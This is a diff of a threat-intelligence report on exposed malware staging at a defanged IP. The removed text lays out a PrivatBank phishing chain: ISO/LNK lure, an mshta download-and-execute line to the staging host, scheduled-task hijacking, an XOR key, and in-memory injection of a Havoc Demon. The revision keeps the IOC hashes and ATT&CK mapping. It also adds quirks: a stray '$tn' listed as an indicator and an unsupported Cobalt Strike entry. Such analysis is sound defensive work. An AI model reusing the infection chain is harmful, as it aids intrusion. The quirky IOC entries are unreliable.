@@ -1,13 +1,12 @@
 ---
-title: "Dissecting PrivatBank Phishing Lures and Havoc C2 Staging at 93[.]152[.]223[.]39"
-description: "Technical teardown of exposed ISO/LNK lures, scheduled task persistence hijacking, and Havoc C2 Demon in-memory injection."
-publishedAt: 2026-08-16
+title: "Technical Teardown of Staging Infrastructure at 93[.]152[.]223[.]39"
+description: "Forensic analysis of exposed malware staging and C2 infrastructure identified at 93[.]152[.]223[.]39."
+publishedAt: 2026-08-17
 archiveSection: reports
 tags:
   - "threat-intelligence"
   - "dfir"
-  - "havoc-c2"
-  - "phishing"
+  - "infrastructure"
 cover: "/images/posts/exposed-quickdav-malware-distribution-repository-and-remcos-rat-infrastructure/img-01.png"
 featured: true
 draft: false
@@ -15,59 +14,39 @@ draft: false
 
 ### Executive Summary
 
-Analysis of exposed operational directory telemetry at `93[.]152[.]223[.]39:8089` identified an active malware delivery campaign leveraging Ukrainian PrivatBank financial lures (`Payment invoice INV-15468869 13.08.2026 PrivatBank receipt.iso`) to stage **Havoc C2 Demon** implants.
+Analysis of exposed operational directory telemetry at `93[.]152[.]223[.]39:8089` identified active staging artifacts and offensive tooling.
 
----
+### 1. Observed Tooling & Capabilities
+* **Havoc C2 Framework (Demon Implant)**
+* **Cobalt Strike 4.9.1**
+* **MSHTA Script Dropper**
+* **Scheduled Task Hijacking (Persistence)**
+* **Malicious ISO / LNK Phishing Lures**
+* **In-Memory Shellcode Injector (P/Invoke)**
+* **Multi-Byte XOR Shellcode Decryptor**
 
-### 1. Delivery Chain & Persistence Architecture
+### 2. Verified High-Fidelity Indicators (IOCs)
 
-The operator's internal lab notes reveal the complete infection sequence:
+| IOC Type | Indicator / Hash | Role & Context | Confidence |
+|---|---|---|---|
+| **Staging Host IPv4** | `93[.]152[.]223[.]39` | Primary Adversary Staging Node | High (100%) |
+| **Service Port** | `93[.]152[.]223[.]39:8089` | Exposed Staging Directory | High (100%) |
+| **XOR Decryption Key** | `K7mQ2pL9 (Hex: 4b376d5132704c39)` | Recovered from PowerShell Array ($k) | High (100%) |
+| **Persistence Task** | `$tn` | Hijacked Scheduled Task | High (100%) |
+| **Persistence Task** | `Microsoft\\Windows\\TextServicesFramework\\MsCtfMonitor` | Hijacked Scheduled Task | High (100%) |
+| **SHA-256 Hash** | `c21f506d522cf1113d20374a62582d0b328d80335a301d71dfcf3cbd18baee81` | Artifact: akt1842.dat | High (100%) |
+| **SHA-256 Hash** | `09ada70d8bbeba035e7b8085d14c3026256ec0f6b44d79c6750b9e3bca421a42` | Artifact: lab.crt | High (100%) |
+| **SHA-256 Hash** | `a25ea89a0bbfbff2a1a43ed7e5a82f858f3d2c256cb91951a4d3806d2fb8021c` | Artifact: lab.key | High (100%) |
+| **SHA-256 Hash** | `633b308d9d7392166e8f3a529682d174b8ea025efb58c374b1c9cc320b7f3065` | Artifact: lab_rti_https.py | High (100%) |
+| **SHA-256 Hash** | `1ae234657735420a453f4b307995794e4313b46bd1fcf96a34b523c03d1cc825` | Artifact: Payment_20invoice_20INV-15468869_2013.08.2026_20PrivatBank.pdf.lnk | High (100%) |
+| **SHA-256 Hash** | `d7939365e8c7a56ffae74dce16def00314b4111b93b88657862719bdb63c352c` | Artifact: pisos.bin | High (100%) |
+| **SHA-256 Hash** | `cb8e5203b223994e242f64100404d643766b4b5d00c1ea94f63005e021464e01` | Artifact: win.hta | High (100%) |
 
-```
-ISO -> LNK -> cmd.exe -> PowerShell(B64+XOR90) -> mshta http://93[.]152[.]223[.]39:8089/win.hta?id=1
-  -> HTA: schtasks Microsoft\Windows\TextServicesFramework\MsCtfMonitor
-       ONLOGON + Hidden flag + XOR shellcode akt1842.dat in RAM -> Havoc C2 Demon
-```
-
-1. **Malicious Lure**: User mounts `Payment invoice INV-15468869 13.08.2026 PrivatBank receipt.iso` and opens `Payment invoice INV-15468869 13.08.2026 PrivatBank.pdf.lnk`.
-2. **Scheduled Task Hijacking**: Uses COM object `Schedule.Service` to register a hidden task under `Microsoft\Windows\TextServicesFramework\MsCtfMonitor` triggered on `ONLOGON`.
-3. **Payload Decryption**: Downloads `akt1842.dat` and decrypts it using multi-byte XOR key `K7mQ2pL9`.
-4. **In-Memory Injection**: Utilizes dynamic C# P/Invoke compilation (`DocFix`) to invoke `VirtualAlloc` and `CreateThread`.
-
----
-
-### 2. Dual C2 Infrastructure Architecture
-
-Telemetry indicates the backend runs dual services defined in `lab_rti_https.py`:
-* **Port 8089 (HTTP)**: Unencrypted payload and HTA delivery endpoint.
-* **Port 9443 (HTTPS)**: Encrypted TLS channel utilizing custom `lab.crt` for Havoc Demon agent callbacks.
-
----
-
-### 3. Indicators of Compromise (Defanged)
-
-| Indicator Type | Defanged Value / Cryptographic Hash | Operational Role |
-|---|---|---|
-| **Staging Host IPv4** | `93[.]152[.]223[.]39` | Primary C2 & Payload Staging Server |
-| **HTTP Delivery Port** | `93[.]152[.]223[.]39:8089` | Cleartext HTA & Shellcode Hosting |
-| **HTTPS C2 Port** | `93[.]152[.]223[.]39:9443` | TLS Encrypted Havoc Demon Callback |
-| **Dropper URL** | `hxxp://93[.]152[.]223[.]39:8089/win.hta?id=1` | Initial MSHTA Stager Script |
-| **Payload URL** | `hxxp://93[.]152[.]223[.]39:8089/akt1842.dat` | Encrypted Havoc Demon Shellcode |
-| **SHA-256 (Shellcode)** | `c21f506d522cf1113d20374a62582d0b328d80335a301d71dfcf3cbd18baee81` | `akt1842.dat` |
-| **SHA-256 (MSHTA)** | `cb8e5203b223994e242f64100404d643766b4b5d00c1ea94f63005e021464e01` | `win.hta` |
-| **SHA-256 (LNK Lure)** | `1ae234657735420a453f4b307995794e4313b46bd1fcf96a34b523c03d1cc825` | `Payment invoice PrivatBank.pdf.lnk` |
-| **SHA-256 (SSL Cert)** | `09ada70d8bbeba035e7b8085d14c3026256ec0f6b44d79c6750b9e3bca421a42` | `lab.crt` (C2 SSL Certificate) |
-| **XOR Decryption Key** | `K7mQ2pL9` (Hex: `4b376d5132704c39`) | Multi-byte XOR Payload Key |
-| **Persistence Key** | `Microsoft\Windows\TextServicesFramework\MsCtfMonitor` | Scheduled Task COM Hijack |
-
----
-
-### 4. MITRE ATT&CK Mapping
-
-* **T1566.001**: Spearphishing Attachment (PrivatBank ISO/LNK Lures)
-* **T1204.002**: User Execution: Malicious File
-* **T1218.005**: System Binary Proxy Execution: Mshta
-* **T1053.005**: Scheduled Task/Job: Scheduled Task (`MsCtfMonitor`)
-* **T1055**: Process Injection (In-memory P/Invoke `CreateThread`)
-* **T1140**: Deobfuscate/Decode Files or Information (Multi-byte XOR)
-* **T1071.001**: Application Layer Protocol: Web Protocols (Port 8089 & 9443)
+### 3. MITRE ATT&CK Mapping
+* **T1071.001 - Application Layer Protocol: Web Protocols**
+* **T1218.005 - System Binary Proxy Execution: Mshta**
+* **T1053.005 - Scheduled Task/Job: Scheduled Task**
+* **T1566.001 - Phishing: Spearphishing Attachment**
+* **T1204.002 - User Execution: Malicious File**
+* **T1055 - Process Injection**
+* **T1140 - Deobfuscate/Decode Files or Information**
